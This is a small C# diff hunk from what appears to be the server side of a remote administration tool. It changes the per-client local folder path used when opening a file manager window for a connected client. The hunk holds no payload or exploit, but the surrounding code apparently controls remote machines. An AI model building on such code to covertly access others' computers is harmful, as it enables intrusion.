@@ -741,7 +741,7 @@ namespace Server
                                     Text = "fileManager:" + client.ID,
                                     F = this,
                                     Client = client,
-                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
+                                    FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                                 };
                                 fileManager.Show();
                                 ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
